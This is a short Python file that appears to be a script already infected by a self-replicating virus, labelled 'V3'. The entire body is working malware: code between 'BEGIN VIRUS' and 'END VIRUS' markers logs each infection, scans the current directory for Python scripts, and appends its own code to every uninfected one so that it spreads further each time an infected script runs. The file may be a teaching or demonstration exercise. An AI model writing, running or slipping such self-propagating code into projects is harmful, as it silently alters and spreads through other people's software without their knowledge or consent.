if __name__ == "__main__":
    print("victum of infection")
# --- BEGIN VIRUS ---


import sys,os

try:
    x = open('V3_infected.txt', 'a')
    x.write(__file__+'  Infected by V3.py  '+str(sys.argv)+'\n')
    x.close()
except:
    print("Infection log error")

All_scripts = False
mal_scripts = ['V1.py', 'V2.py', 'V3.py']

def find_python_files():
    py_files = []
    for filename in os.listdir('.'):
        if filename.endswith('.py') and filename not in mal_scripts:
            x = open(filename).read()
            if '__name__ == "__main__"' in x or All_scripts:
                py_files.append(filename)
    return py_files

def get_virus_code(src):
    start_mark = "# --- BEGIN VIRUS ---"
    end_mark = ")\n# --- END VIRUS ---"

    if start_mark not in src or end_mark not in src:
        return None

    start = src.index(start_mark)+len(start_mark)
    end = src.index(end_mark)
    return src[start:end+1]

def infection_scripts(py_files):
    malware_code = get_virus_code(open(__file__, "r").read())
    for script in py_files:
        target = open(script).read()
        if '# --- BEGIN VIRUS ---' in target:
            continue
        with open(script, 'a') as f:
            f.write('\n# --- BEGIN VIRUS ---\n')
            f.write(malware_code)
            f.write('\n# --- END VIRUS ---\n')

infection_scripts(find_python_files())
# --- END VIRUS ---
